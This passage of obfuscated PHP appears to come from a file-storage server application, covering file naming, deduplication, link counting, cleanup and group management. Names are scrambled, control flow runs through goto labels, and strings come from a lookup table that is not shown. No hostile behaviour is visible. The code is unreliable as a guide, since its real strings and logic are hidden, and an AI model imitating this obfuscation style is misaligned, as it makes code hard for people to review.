TEMP_PATH . $Fõ£õ¹©×Ò[1712]; if (!is_dir($Cªƒ¹àÌ‘)) { mk_dir($Cªƒ¹àÌ‘); } goto Cİ“„â×…Ğ; CÊõÆà¾ŸŒ: } public function createFileName($A¾¤ŞÑ®Ó­, $fÜÕƒìƒ÷¸ = false) { goto cŒø”½‰Õ™; fâööİäß¯: if (!$a“èÛÛ¥…¹ && !Cache::get($bãÆõ‚…ëŸ)) { $a“èÛÛ¥…¹ = !0; $A¡İø³ñó = IO::mkdir($F°µ»«Ùä‡); if (!IO::exist($A¡İø³ñó . $FÙÁØœòŠ¸[1715])) { IO::mkfile($A¡İø³ñó . $FÙÁØœòŠ¸[1715]); } Cache::set($bãÆõ‚…ëŸ, 1, 3600 * 2); } return $fË¿ƒ˜‘½Ì; goto BëàÕ„ŠĞ; cŒø”½‰Õ™: $FÙÁØœòŠ¸ =& $_SERVER[¹…ÕÄ]; $AÂ‰ø¤™ñï = IO::init($FÙÁØœòŠ¸[8]); $fË¿ƒ˜‘½Ì = $this->makeFilePath($A¾¤ŞÑ®Ó­, $AÂ‰ø¤™ñï, $fÜÕƒìƒ÷¸); goto Bœ®µƒË¯ˆ; Bœ®µƒË¯ˆ: $F°µ»«Ùä‡ = $AÂ‰ø¤™ñï->pathFather($fË¿ƒ˜‘½Ì); static $a“èÛÛ¥…¹ = false; $bãÆõ‚…ëŸ = $FÙÁØœòŠ¸[1714] . md5($F°µ»«Ùä‡); goto fâööİäß¯; BëàÕ„ŠĞ: } public function makeFilePath($D‰ëµÂÖÇÌ, $DÇ„‹ÅÓÒ, $DÛ²ó¤í  = false) { goto c’¢µèŠƒ; cØíõÇ¶Åß: $AóßÅš¿Õ = $eÖ¹ù¹µÈ– . rand_string(5) . short_id(100); $D‰ëµÂÖÇÌ = str_replace($e‰ÒÓò¤¥¶[8], $e‰ÒÓò¤¥¶[70], KodIO::clear($D‰ëµÂÖÇÌ)); $EÜœ“¨±” = $DÇ„‹ÅÓÒ->ext($D‰ëµÂÖÇÌ); goto A÷Áèéâ¥Ë; A÷Áèéâ¥Ë: if (!$D‰ëµÂÖÇÌ) { $EÙÃİˆÉŞñ = $e‰ÒÓò¤¥¶[1718]; } switch ($EÙÃİˆÉŞñ) { case $e‰ÒÓò¤¥¶[1719]: $AóßÅš¿Õ = $AóßÅš¿Õ . $e‰ÒÓò¤¥¶[94] . $DÇ„‹ÅÓÒ->ext($D‰ëµÂÖÇÌ); if ($EÜœ“¨±” == $e‰ÒÓò¤¥¶[1657]) { $AóßÅš¿Õ .= $e‰ÒÓò¤¥¶[1405]; } break; case $e‰ÒÓò¤¥¶[1720]: goto e­å¾´¯µ; e­å¾´¯µ: $dÒğÖ±†±‡ = Model($e‰ÒÓò¤¥¶[1102])->get($e‰ÒÓò¤¥¶[1401]); $dÒ›…ê¢Ê‘ = substr(md5($e‰ÒÓò¤¥¶[1721] . $dÒğÖ±†±‡ . date($e‰ÒÓò¤¥¶[703])), 0, 8); $e¥Ú¬Ç‡¹½ = KodIO::defaultDriver(); goto e¶˜ÏÊÕ”ß; Fòëİñ®‰Ñ: CacheLock::lock($f‰š›Ä¸×); $AóßÅš¿Õ = $eÖ¹ù¹µÈ– . $D‰ëµÂÖÇÌ; if (IO::exist($eÖ¹ù¹µÈ– . $D‰ëµÂÖÇÌ)) { $dŸˆù¿²¨ = substr($D‰ëµÂÖÇÌ, 0, strlen($D‰ëµÂÖÇÌ) - strlen($EÜœ“¨±”)); $AóßÅš¿Õ = $eÖ¹ù¹µÈ– . $dŸˆù¿²¨ . substr($DÛ²ó¤í , 0, 5) . $e‰ÒÓò¤¥¶[94] . $EÜœ“¨±”; } goto a„Ï„Óò—ù; a„Ï„Óò—ù: if (IO::isTypeObject($AóßÅš¿Õ) && !IO::isUploadServer($AóßÅš¿Õ)) { $B–ÆÈğ‡çÅ = IO::setContent($AóßÅš¿Õ, $e‰ÒÓò¤¥¶[33]); if (!$B–ÆÈğ‡çÅ) { show_json($e‰ÒÓò¤¥¶[1724], !1); } } CacheLock::unlock($f‰š›Ä¸×); break; goto AÏÌ³­”øÛ; e¶˜ÏÊÕ”ß: $eÖ¹ù¹µÈ– = $e‰ÒÓò¤¥¶[1100] . $e¥Ú¬Ç‡¹½[$e‰ÒÓò¤¥¶[388]] . $e‰ÒÓò¤¥¶[396] . date($e‰ÒÓò¤¥¶[1722]) . $dÒ›…ê¢Ê‘ . $e‰ÒÓò¤¥¶[8]; if ($EÜœ“¨±” == $e‰ÒÓò¤¥¶[1657]) { $D‰ëµÂÖÇÌ .= $e‰ÒÓò¤¥¶[1405]; } $f‰š›Ä¸× = $e‰ÒÓò¤¥¶[1723] . $eÖ¹ù¹µÈ– . $D‰ëµÂÖÇÌ; goto Fòëİñ®‰Ñ; AÏÌ³­”øÛ: case $e‰ÒÓò¤¥¶[1718]: break; default: break; } return $AóßÅš¿Õ; goto Eë„„†®¥¥; c’¢µèŠƒ: $e‰ÒÓò¤¥¶ =& $_SERVER[¹…ÕÄ]; $EÙÃİˆÉŞñ = Model($e‰ÒÓò¤¥¶[1102])->get($e‰ÒÓò¤¥¶[1716]); $eÖ¹ù¹µÈ– = KodIO::defaultIO() . date($e‰ÒÓò¤¥¶[1717]); goto cØíõÇ¶Åß; Eë„„†®¥¥: } public function addFileByRemote($E¦Ë¼£ïëæ, $D¨Ş¡ÉàÙ‘, $Dù‘Ã‘¶¬¦ = array()) { goto Cå«ôÃ·ëÀ; Aòì±¤å³Å: $cøöß›ó‘¬ = IO::hashMd5($E¦Ë¼£ïëæ, $C·åÍ°¾Ñ); $d‹òÈ¢ù‚ = KodIO::defaultDriver(); $a¥®œíµÄİ = array($AÂí†¼‚¹[543] => IO::size($E¦Ë¼£ïëæ), $AÂí†¼‚¹[1725] => 1, $AÂí†¼‚¹[407] => $D¨Ş¡ÉàÙ‘, $AÂí†¼‚¹[755] => $d‹òÈ¢ù‚[$AÂí†¼‚¹[388]], $AÂí†¼‚¹[408] => $E¦Ë¼£ïëæ, $AÂí†¼‚¹[1726] => $Dù‘Ã‘¶¬¦[$AÂí†¼‚¹[170]] ? $Dù‘Ã‘¶¬¦[$AÂí†¼‚¹[170]] : IO::hashSimple($E¦Ë¼£ïëæ), $AÂí†¼‚¹[1727] => $cøöß›ó‘¬ ? $cøöß›ó‘¬ : $C·åÍ°¾Ñ); goto C±ëš†Óê•; Cå«ôÃ·ëÀ: $AÂí†¼‚¹ =& $_SERVER[¹…ÕÄ]; if (!IO::exist($E¦Ë¼£ïëæ)) { return !1; } $C·åÍ°¾Ñ = $Dù‘Ã‘¶¬¦[$AÂí†¼‚¹[169]] ? $Dù‘Ã‘¶¬¦[$AÂí†¼‚¹[169]] : $AÂí†¼‚¹[33]; goto Aòì±¤å³Å; C±ëš†Óê•: if ($CÀ„¿¹¤Œá = $this->addFileCheckExist($a¥®œíµÄİ[$AÂí†¼‚¹[170]], $a¥®œíµÄİ[$AÂí†¼‚¹[169]], $a¥®œíµÄİ[$AÂí†¼‚¹[77]])) { return $CÀ„¿¹¤Œá; } return $this->addFileData($a¥®œíµÄİ); goto AçÚËÏ™Ş»; AçÚËÏ™Ş»: } private function addFileData($d†íÜ”¦õ) { $d¦Ñ‹‘ììŒ =& $_SERVER[¹…ÕÄ]; if (!$d†íÜ”¦õ) { return !1; } $d†íÜ”¦õ[$d¦Ñ‹‘ììŒ[77]] = intval($d†íÜ”¦õ[$d¦Ñ‹‘ììŒ[77]]); if (!$d†íÜ”¦õ[$d¦Ñ‹‘ììŒ[77]] && strlen($d†íÜ”¦õ[$d¦Ñ‹‘ììŒ[170]]) > 32) { $d†íÜ”¦õ[$d¦Ñ‹‘ììŒ[77]] = intval(substr($d†íÜ”¦õ[$d¦Ñ‹‘ììŒ[170]], 32)); } $A»‘æ¨ö… = $this->add($d†íÜ”¦õ); return $this->find($A»‘æ¨ö…); } public function addFile($fˆğŠÕ±Â, $EšÜ®–ÍÛ­, $a£§Ÿ„Äù = false) { goto AÄŠ·™ŠÔŒ; cê‚Â§†«: return $b™§”ÜŞ¼ó; goto cğœ·µ°ĞÂ; Cß¦ ùº: $f—Òù»¦×º = $this->addFileMake($fˆğŠÕ±Â, $f¼• »ÍšÚ, $cã™ŒÍĞï½, $C¹öÎ¥ÚÄö, $EšÜ®–ÍÛ­, $a£§Ÿ„Äù); $b™§”ÜŞ¼ó = $this->addFileData($f—Òù»¦×º); CacheLock::unlock($d»ô•ÉŞ˜); goto cê‚Â§†«; b²õõ”«ƒÖ: $d»ô•ÉŞ˜ = $_SERVER[¹…ÕÄ][1728] . $C¹öÎ¥ÚÄö; CacheLock::lock($d»ô•ÉŞ˜); if ($bõôËïØ¦‚ = $this->addFileCheckExist($cã™ŒÍĞï½, $C¹öÎ¥ÚÄö, $f¼• »ÍšÚ)) { CacheLock::unlock($d»ô•ÉŞ˜); return $bõôËïØ¦‚; } goto Cß¦ ùº; AÄŠ·™ŠÔŒ: $cã™ŒÍĞï½ = IO::hashSimple($fˆğŠÕ±Â); $C¹öÎ¥ÚÄö = IO::hashMd5($fˆğŠÕ±Â); $f¼• »ÍšÚ = IO::size($fˆğŠÕ±Â); goto b²õõ”«ƒÖ; cğœ·µ°ĞÂ: } public function addFileMake($e®‚Ûêšç, $F¥ÒÊº¶—, $Aè¸Ì¥«ß®, $bî¹ÖæÓóŸ, $dé ƒ“¨®½, $BœéÊ¸Ğï¼) { goto cğŠƒè„Àï; c§ÈÃ“‡Ï: $BñéÚÎ£Šø = get_path_this($a£ÖÄ¨’±); if ($BœéÊ¸Ğï¼) { $cáĞ¼„òºî = IO::move($e®‚Ûêšç, $AºÜŒ˜ëÉ¢, !1, $BñéÚÎ£Šø); } else { $cáĞ¼„òºî = IO::copy($e®‚Ûêšç, $AºÜŒ˜ëÉ¢, !1, $BñéÚÎ£Šø); } if (!$cáĞ¼„òºî) { return !1; } goto eøÎ±Ô”¯; cğŠƒè„Àï: $Fµ–·×ª =& $_SERVER[¹…ÕÄ]; $a£ÖÄ¨’± = $this->createFileName($dé ƒ“¨®½, $bî¹ÖæÓóŸ); $AºÜŒ˜ëÉ¢ = get_path_father($a£ÖÄ¨’±); goto c§ÈÃ“‡Ï; eøÎ±Ô”¯: $céÂòéÉÒ = KodIO::defaultDriver(); $B‘ƒğ‰®¼Ø = array($Fµ–·×ª[543] => $F¥ÒÊº¶—, $Fµ–·×ª[1725] => 1, $Fµ–·×ª[407] => $dé ƒ“¨®½, $Fµ–·×ª[755] => $céÂòéÉÒ[$Fµ–·×ª[388]], $Fµ–·×ª[408] => $a£ÖÄ¨’±, $Fµ–·×ª[1726] => $Aè¸Ì¥«ß®, $Fµ–·×ª[1727] => $bî¹ÖæÓóŸ); return $B‘ƒğ‰®¼Ø; goto C”‰Ç¤®ùÈ; C”‰Ç¤®ùÈ: } public function addFileCheckExist($c†‘ô ºÄÙ, $C˜®ÔÜ‘ª†, $eçœêº¸») { $E£¤‚ù÷±Õ =& $_SERVER[¹…ÕÄ]; $fö‰†÷½ò” = $this->findByHash($c†‘ô ºÄÙ, $C˜®ÔÜ‘ª†); if (!$fö‰†÷½ò”) { return !1; } $f†ÂéŒ«Î = array($E£¤‚ù÷±Õ[1725] => intval($fö‰†÷½ò”[$E£¤‚ù÷±Õ[1729]]) + 1, $E£¤‚ù÷±Õ[543] => $eçœêº¸»); $this->where(array($E£¤‚ù÷±Õ[442] => $fö‰†÷½ò”[$E£¤‚ù÷±Õ[441]]))->save($f†ÂéŒ«Î); return $fö‰†÷½ò”; } public function remove($d²ŠêòæØ¼) { $this->linkCountChange($d²ŠêòæØ¼, !1); $this->clearEmpty(); return !0; } public function linkAdd($Dßé¢¿Ã”ø) { $this->linkCountChange($Dßé¢¿Ã”ø, !0); } public function linkCountChange($fğ³Å×»ä³, $cÌµßˆèìŠ) { goto BŸŒ”Û¼²Õ; fÇœ¸ÄöÚá: foreach ($dÎƒõ¡Ÿ„ª as $D…Â—Äˆ‰ => $F½ÑŒè„’Ù) { $c£…¨™ÅŠ³ = $F½ÑŒè„’Ù . $aİîƒÀªŒó[33]; if (!$dº†íÎ¦éÊ[$c£…¨™ÅŠ³]) { $dº†íÎ¦éÊ[$c£…¨™ÅŠ³] = array(); } $dº†íÎ¦éÊ[$c£…¨™ÅŠ³][] = $D…Â—Äˆ‰; } foreach ($dº†íÎ¦éÊ as $F½ÑŒè„’Ù => $c‹·©®†¦ª) { if (!$c‹·©®†¦ª) { continue; } $F½ÑŒè„’Ù = $cÌµßˆèìŠ ? $F½ÑŒè„’Ù : -intval($F½ÑŒè„’Ù); $cš“„ôÃñ = array($aİîƒÀªŒó[441] => array($aİîƒÀªŒó[7], $c‹·©®†¦ª)); if ($F½ÑŒè„’Ù < 0) { $cš“„ôÃñ[$aİîƒÀªŒó[1729]] = array($aİîƒÀªŒó[951], abs($F½ÑŒè„’Ù)); } $this->where($cš“„ôÃñ)->setAdd($aİîƒÀªŒó[1729], $F½ÑŒè„’Ù); } goto bìÓ¤ó Ò; d¹Î‘öÙ­°: $dÎƒõ¡Ÿ„ª = array(); foreach ($fğ³Å×»ä³ as $D…Â—Äˆ‰) { $c£…¨™ÅŠ³ = $D…Â—Äˆ‰ . $aİîƒÀªŒó[33]; if (!$dÎƒõ¡Ÿ„ª[$c£…¨™ÅŠ³]) { $dÎƒõ¡Ÿ„ª[$c£…¨™ÅŠ³] = 0; } $dÎƒõ¡Ÿ„ª[$c£…¨™ÅŠ³]++; } $dº†íÎ¦éÊ = array(); goto fÇœ¸ÄöÚá; BŸŒ”Û¼²Õ: $aİîƒÀªŒó =& $_SERVER[¹…ÕÄ]; if (!$fğ³Å×»ä³) { return; } if (!is_array($fğ³Å×»ä³)) { $fğ³Å×»ä³ = array($fğ³Å×»ä³); } goto d¹Î‘öÙ­°; bìÓ¤ó Ò: } public function findByHash($aéå»·¦£, $dò¬†ô³˜Œ = false) { $BŒæ¤ÛŸ“ñ =& $_SERVER[¹…ÕÄ]; if (!$aéå»·¦£ && !$dò¬†ô³˜Œ) { return !1; } $A“œ¿Ü­ÜŞ = array($BŒæ¤ÛŸ“ñ[1726] => $aéå»·¦£); if ($dò¬†ô³˜Œ) { $A“œ¿Ü­ÜŞ = array($BŒæ¤ÛŸ“ñ[1727] => $dò¬†ô³˜Œ); } return $this->order($BŒæ¤ÛŸ“ñ[1730])->where($A“œ¿Ü­ÜŞ)->find(); } public function clearEmpty($b÷¤Š»ğ¥É = 0) { goto d¸ÆÄƒ˜Ì; bÔİ‡ÖŒéô: $cË×ÂŠÂÂÈ = $this->where($fä ¿æ†Œ)->select(); if (!$cË×ÂŠÂÂÈ) { return; } $DìÉ°¢Ù = new Task($E„í£ËµÆî[1732], $E„í£ËµÆî[33], count($cË×ÂŠÂÂÈ)); goto Eæ‹…›ãÆÓ; Eæ‹…›ãÆÓ: foreach ($cË×ÂŠÂÂÈ as $cÕöµæß…„) { $DìÉ°¢Ù->update(1); $this->resetFile($cÕöµæß…„); } $DìÉ°¢Ù->end(); goto AøîÙ¦«ß; d¸ÆÄƒ˜Ì: $E„í£ËµÆî =& $_SERVER[¹…ÕÄ]; $b‰Â˜õä¡ = time() - 3600 * 24 * $b÷¤Š»ğ¥É; $fä ¿æ†Œ = $E„í£ËµÆî[1731] . $b‰Â˜õä¡; goto bÔİ‡ÖŒéô; AøîÙ¦«ß: } public function resetFile($D Œ£ØÉ‘) { goto c‚Õ®“„Ò; c‚Õ®“„Ò: $bï†×øá‹ =& $_SERVER[¹…ÕÄ]; $B¾£‘ÜÙ…ø = array($bï†×øá‹[442] => $D Œ£ØÉ‘[$bï†×øá‹[441]]); $Bç’ì‹ÒÜè = Model($bï†×øá‹[1183])->where($B¾£‘ÜÙ…ø)->count(); goto CØ”ø¥ÈãÁ; CØ”ø¥ÈãÁ: $e’×éïÏœ° = Model($bï†×øá‹[1733])->where($B¾£‘ÜÙ…ø)->count(); $FñÓí“ïøË = intval($Bç’ì‹ÒÜè) + intval($e’×éïÏœ°); if ($FñÓí“ïøË == 0) { IO::remove($D Œ£ØÉ‘[$bï†×øá‹[75]]); $this->where($B¾£‘ÜÙ…ø)->delete(); $this->metaSet($D Œ£ØÉ‘[$bï†×øá‹[441]], null, null); return; } goto dÏ®‘¡¢Û÷; dÏ®‘¡¢Û÷: if ($D Œ£ØÉ‘[$bï†×øá‹[1729]] != $FñÓí“ïøË) { $this->where($B¾£‘ÜÙ…ø)->save(array($bï†×øá‹[1725] => $FñÓí“ïøË)); } goto Eèİé£ì; Eèİé£ì: } public function storageInfo($E×šããİšÈ = false) { goto F¾‘¿ç„•ë; E‡à¶„ˆ¯Û: $c™½ÃĞ¥ª = 1; $D”õ“ Çà = 0; $EÖğÜò÷ïŸ = 5000; goto FÓï•ì¨è; FÓï•ì¨è: for ($Bªö³»©ŠÅ = 0; $Bªö³»©ŠÅ < $dÚÖĞ«ÔØ¨; $Bªö³»©ŠÅ = $Bªö³»©ŠÅ + $EÖğÜò÷ïŸ) { $aß¶ŒÏ¡È… = $this->limit($Bªö³»©ŠÅ, $Bªö³»©ŠÅ + $EÖğÜò÷ïŸ)->select(); foreach ($aß¶ŒÏ¡È… as $A†›æ‡±”) { $c™½ÃĞ¥ª += $A†›æ‡±”[$BÉÂ¾àßÎÅ[77]] * $A†›æ‡±”[$BÉÂ¾àßÎÅ[1729]]; $då­Ï¿áÄå += $A†›æ‡±”[$BÉÂ¾àßÎÅ[77]] * ($A†›æ‡±”[$BÉÂ¾àßÎÅ[1729]] - 1); $D”õ“ Çà += $A†›æ‡±”[$BÉÂ¾àßÎÅ[1729]]; } } $AÅ“Æõ‰˜æ = array($BÉÂ¾àßÎÅ[1734] => $c™½ÃĞ¥ª, $BÉÂ¾àßÎÅ[1735] => $då­Ï¿áÄå, $BÉÂ¾àßÎÅ[1736] => $då­Ï¿áÄå / $c™½ÃĞ¥ª, $BÉÂ¾àßÎÅ[81] => $dÚÖĞ«ÔØ¨, $BÉÂ¾àßÎÅ[1737] => $D”õ“ Çà); return $AÅ“Æõ‰˜æ; goto dÎº»¨«á¾; F¾‘¿ç„•ë: $BÉÂ¾àßÎÅ =& $_SERVER[¹…ÕÄ]; $dÚÖĞ«ÔØ¨ = $this->count() + 0.0; $då­Ï¿áÄå = 0; goto E‡à¶„ˆ¯Û; dÎº»¨«á¾: } } class GroupModel extends ModelBase { protected $tableName = "\x67\x72\x6f\x75\160"; protected $tableMeta = array("\x74\141\142\x6c\145\116\141\155\145" => "\x67\162\x6f\x75\x70\137\x6d\145\164\141", "\x6d\x65\164\141\x46\151\145\x6c\144" => "\147\x72\157\x75\x70\111\x44"); protected function cacheFunctionAlias($fãÙƒ¦µŒÈ) { $c»÷½ø§† =& $_SERVER[¹…ÕÄ]; return array($c»÷½ø§†[1738] => array($fãÙƒ¦µŒÈ[0], $c»÷½ø§†[1739]), $c»÷½ø§†[1740] => array($fãÙƒ¦µŒÈ[0], $c»÷½ø§†[1739])); } protected function getInfo($D’ÚÜ›ã‰) { $B“È²–ƒÃ = $this->getInfoSimple($D’ÚÜ›ã‰); if (!$B“È²–ƒÃ) { return !1; } return $this->_listDataApplyItem($B“È²–ƒÃ); } protected function getInfoSimple($aÓòÑîÁù¾, $d™ââ„Î¤É = false) { $E¢àâ‰ÓÖä =& $_SERVER[¹…ÕÄ]; if ($d™ââ„Î¤É) { $bŠ‡òİ‹ŞĞ = array($E¢àâ‰ÓÖä[1667] => intval($aÓòÑîÁù¾)); $fğâ›Œ…İª = $this->where($bŠ‡òİ‹ŞĞ)->find(); return is_array($fğâ›Œ…İª) ? $fğâ›Œ…İª : array(); } return $this->cacheFunctionGet($E¢àâ‰ÓÖä[1741], $aÓòÑîÁù¾); } protected function groupAdd($fƒøŸÅ¿©) { goto aîªæÖ‰í; aÎ§’©èÅ¼: if (!empty($fƒøŸÅ¿©[$dÀœ¼©‚ª[1667]])) { $dëËÜ¨ÄÇø[$dÀœ¼©‚ª[1667]] = $fƒøŸÅ¿©[$dÀœ¼©‚ª[1667]]; } $E›éÇ¨Ïğ = $this->add($dëËÜ¨ÄÇø); $this->setNamePinyin($E›éÇ¨Ïğ, $dëËÜ¨ÄÇø[$dÀœ¼©‚ª[28]]); goto Fç²à§­; aÙì“èù: if ($c¶¬ÜÕ±š×[$dÀœ¼©‚ª[481]]) { $dÅ„¬ÜòÒÙ = $c¶¬ÜÕ±š×[$dÀœ¼©‚ª[481]] . $c¶¬ÜÕ±š×[$dÀœ¼©‚ª[1667]] . $dÀœ¼©‚ª[47]; } $dëËÜ¨ÄÇø = array($dÀœ¼©‚ª[407] => $this->groupNameAuto($fƒøŸÅ¿©[$dÀœ¼©‚ª[472]], $fƒøŸÅ¿©[$dÀœ¼©‚ª[28]]), $dÀœ¼©‚ª[389] => $fƒøŸÅ¿©[$dÀœ¼©‚ª[472]], $dÀœ¼©‚ª[548] => $dÅ„¬ÜòÒÙ, $dÀœ¼©‚ª[1742] => $fƒøŸÅ¿©[$dÀœ¼©‚ª[1651]], $dÀœ¼©‚ª[1743] => 0, $dÀœ¼©‚ª[1671] => 0); if (isset($fƒøŸÅ¿©[$dÀœ¼©‚ª[1690]])) { $dëËÜ¨ÄÇø[$dÀœ¼©‚ª[1690]] = $fƒøŸÅ¿©[$dÀœ¼©‚ª[1690]]; } else { $DØ¶¿á×Ç« = $this->max($dÀœ¼©‚ª[1690]); if (!$DØ¶¿á×Ç«) { $DØ¶¿á×Ç« = 0; } $dëËÜ¨ÄÇø[$dÀœ¼©‚ª[1690]] = $DØ¶¿á×Ç« + 1; } goto aÎ§’©èÅ¼; aîªæÖ‰í: $dÀœ¼©‚ª =& $_SERVER[¹…ÕÄ]; if (!$fƒøŸÅ¿©[$dÀœ¼©‚ª[472]] && isset($fƒøŸÅ¿©[$dÀœ¼©‚ª[1667]]) && $fƒøŸÅ¿©[$dÀœ¼©‚ª[1667]] == 1) { if ($c¶¬ÜÕ±š× = $this->getInfoSimple($fƒøŸÅ¿©[$dÀœ¼©‚ª[1667]], !0)) { return $fƒøŸÅ¿©[$dÀœ¼©‚ª[1667]]; } } else { $c¶¬ÜÕ±š× = $this->getInfoSimple($fƒøŸÅ¿©[$dÀœ¼©‚ª[472]]); if (!$c¶¬ÜÕ±š×) { return !1; } } $dÅ„¬ÜòÒÙ = $dÀœ¼©‚ª[493]; goto aÙì“èù; Fç²à§­: if (isset($fƒøŸÅ¿©[$dÀœ¼©‚ª[1744]])) { $this->metaSet($E›éÇ¨Ïğ, array($dÀœ¼©‚ª[1744] => $fƒøŸÅ¿©[$dÀœ¼©‚ª[1744]], $dÀœ¼©‚ª[1745] => $fƒøŸÅ¿©[$dÀœ¼©‚ª[1745]])); unset($fƒøŸÅ¿©[$dÀœ¼©‚ª[1744]]); unset($fƒøŸÅ¿©[$dÀœ¼©‚ª[1745]]); } Model($dÀœ¼©‚ª[1183])->groupRootAdd($E›éÇ¨Ïğ); return $E›éÇ¨Ïğ; goto cÏÕã¡£†; cÏÕã¡£†: } protected function groupEdit($fÔ‹Çµ»ø›, $E…ÇÇä‘Úå) { goto B°Ê¿ÌÍ„; CéâÚ–ÅÍ: if (isset($E…ÇÇä‘Úå[$aİµÚ·ÈÖ[28]]) && $E…ÇÇä‘Úå[$aİµÚ·ÈÖ[28]] != $c»©¡„‚Äğ[$aİµÚ·ÈÖ[28]]) { $this->_clearChildrenCache($c»©¡„‚Äğ); } return $this->where(array($aİµÚ·ÈÖ[1746] => $fÔ‹Çµ»ø›))->save($E…ÇÇä‘Úå); goto F—ğØÓ½Ó; bËš¢Ø×«: if (!empty($E…ÇÇä‘Úå[$aİµÚ·ÈÖ[472]])) { $cÄ­ö¡˜¢ = $this->getInfoSimple($E…ÇÇä‘Úå[$aİµÚ·ÈÖ[472]]); if (!$cÄ­ö¡˜¢) { return !1; } if ($c»©¡„‚Äğ[$aİµÚ·ÈÖ[1667]] == $cÄ­ö¡˜¢[$aİµÚ·ÈÖ[1667]]) { return !1; } if ($E…ÇÇä‘Úå[$aİµÚ·ÈÖ[472]] != $c»©¡„‚Äğ[$aİµÚ·ÈÖ[472]]) { if ($cÄ­ö¡˜¢[$aİµÚ·ÈÖ[481]] !== $c»©¡„‚Äğ[$aİµÚ·ÈÖ[481]] && strpos($cÄ­ö¡˜¢[$aİµÚ·ÈÖ[481]], $c»©¡„‚Äğ[$aİµÚ·ÈÖ[481]] . $c»©¡„‚Äğ[$aİµÚ·ÈÖ[1667]] . $aİµÚ·ÈÖ[47]) === 0) { return !1; } $E…ÇÇä‘Úå[$aİµÚ·ÈÖ[548]] = $cÄ­ö¡˜¢[$aİµÚ·ÈÖ[481]] . $E…ÇÇä‘Úå[$aİµÚ·ÈÖ[472]] . $aİµÚ·ÈÖ[47]; $this->_changeChildLevel($c»©¡„‚Äğ, $cÄ­ö¡˜¢); } } if (isset($E…ÇÇä‘Úå[$aİµÚ·ÈÖ[28]])) { $this->setNamePinyin($fÔ‹Çµ»ø›, $E…ÇÇä‘Úå[$aİµÚ·ÈÖ[28]]); } if (isset($E…ÇÇä‘Úå[$aİµÚ·ÈÖ[1744]])) { $this->metaSet($fÔ‹Çµ»ø›, array($aİµÚ·ÈÖ[1744] => $E…ÇÇä‘Úå[$aİµÚ·ÈÖ[1744]], $aİµÚ·ÈÖ[1745] => $E…ÇÇä‘Úå[$aİµÚ·ÈÖ[1745]])); unset($E…ÇÇä‘Úå[$aİµÚ·ÈÖ[1744]]); unset($E…ÇÇä‘Úå[$aİµÚ·ÈÖ[1745]]); } goto CéâÚ–ÅÍ; B°Ê¿ÌÍ„: $aİµÚ·ÈÖ =& $_SERVER[¹…ÕÄ]; $c»©¡„‚Äğ = $this->getInfoSimple($fÔ‹Çµ»ø›); if (!$c»©¡„‚Äğ) { return !1; } goto bËš¢Ø×«; F—ğØÓ½Ó: } private function _clearChildrenCache($Fª“ İİâ) { $b”ŞÏ²°ô¸ =& $_SERVER[¹…ÕÄ]; $D´£„å¸¨Å = array($b”ŞÏ²°ô¸[548] => array($b”ŞÏ²°ô¸[507], $Fª“ İİâ[$b”ŞÏ²°ô¸[481]] . $Fª“ İİâ[$b”ŞÏ²°ô¸[1667]] . $b”ŞÏ²°ô¸[508])); $E™†»Ñ”è = $this->field($b”ŞÏ²°ô¸[1667])->where($D´£„å¸¨Å)->select(); foreach ($E™†»Ñ”è as $eóô²¯Û…±) { $this->cacheFunctionClear($b”ŞÏ²°ô¸[1747], $eóô²¯Û…±[$b”ŞÏ²°ô¸[1667]]); $this->cacheFunctionClear($b”ŞÏ²°ô¸[1741], $eóô²¯Û…±[$b”ŞÏ²°ô¸[1667]]); } } private function _changeChildLevel($B«åĞ˜ç¿ƒ, $BêÁ¬°›Ùé, $cßÖ¢ç°…„ = false) { goto CÑ¢“½ÇºÕ; B‡‘‚ôÏ³©: $this->_clearChildrenCache($B«åĞ˜ç¿ƒ); $this->where($Eµî—­Š‘ï)->data($dÜ’‡©ßØ)->save(); goto fˆ‹ˆâ«Ôå; CÑ¢“½ÇºÕ: $d‘ŞçöÛ”  =& $_SERVER[¹…ÕÄ]; $cÁ÷ÒŠ†ï = $B«åĞ˜ç¿ƒ[$d‘ŞçöÛ” [481]] . $B«åĞ˜ç¿ƒ[$d‘ŞçöÛ” [1667]] . $d‘ŞçöÛ” [47]; $Fèãè°Œª… = $BêÁ¬°›Ùé[$d‘ŞçöÛ” [481]] . $BêÁ¬°›Ùé[$d‘ŞçöÛ” [1667]] . $d‘ŞçöÛ” [47] . $B«åĞ˜ç¿ƒ[$d‘ŞçöÛ” [1667]] . $d‘ŞçöÛ” [47]; goto F³¹‹ŠÎ; F³¹‹ŠÎ: if ($cßÖ¢ç°…„) { $Fèãè°Œª… = $BêÁ¬°›Ùé[$d‘ŞçöÛ” [481]] . $BêÁ¬°›Ùé[$d‘ŞçöÛ” [1667]] . $d‘ŞçöÛ” [47]; } $Eµî—­Š‘ï = array($d‘ŞçöÛ” [548] => array($d‘ŞçöÛ” [507], $B«åĞ˜ç¿ƒ[$d‘ŞçöÛ” [481]] . $B«åĞ˜ç¿ƒ[$d‘ŞçöÛ” [1667]] . $d‘ŞçöÛ” [508])); $dÜ’‡©ßØ = array($d‘ŞçöÛ” [548] => array($d‘ŞçöÛ” [556], "\x72\145\x70\x6c\141\143\x65\x28\160\141\162\x65\x6e\164\114\145\166\x65\x6c\x2c\x27{$cÁ÷ÒŠ†ï}\x27\x2c\47{$Fèãè°Œª…}\47\x29")); goto B‡‘‚ôÏ³©; fˆ‹ˆâ«Ôå: } public function setNamePinyin($bĞŸ”å±ê, $AÍ˜ÎØ‰Ğ… = false) { $aƒ“²Éíö¶ =& $_SERVER[¹…ÕÄ]; if (!$AÍ˜ÎØ‰Ğ…) { $C©áîÔµ‘ä = $this->getInfoSimple($bĞŸ”å±ê); $AÍ˜ÎØ‰Ğ… = $C©áîÔµ‘ä[$aƒ“²Éíö¶[28]]; } if (!Input::check($AÍ˜ÎØ‰Ğ…, $aƒ“²Éíö¶[551])) { $this->metaSet($bĞŸ”å±ê, $aƒ“²Éíö¶[438], null); $this->metaSet($bĞŸ”å±ê, $aƒ“²Éíö¶[437], null); return; } $F‡‚ÆÔ¿‹â = array($aƒ“²Éíö¶[438] => str_replace($aƒ“²Éíö¶[50], $aƒ“²Éíö¶[33], Pinyin::encode($AÍ˜ÎØ‰Ğ…)), $aƒ“²Éíö¶[437] => Pinyin::encode($AÍ˜ÎØ‰Ğ…, $aƒ“²Éíö¶[552])); $this->metaSet($bĞŸ”å±ê, $F‡‚ÆÔ¿‹â); } protected function groupStatus($E”¸•­ÒÉË, $A“ê¸«å‘£) { goto cøÑ‡°Ø˜¿; BÅ«¯†¶‡Í: foreach ($b±ºÒÖäÂ‹ as 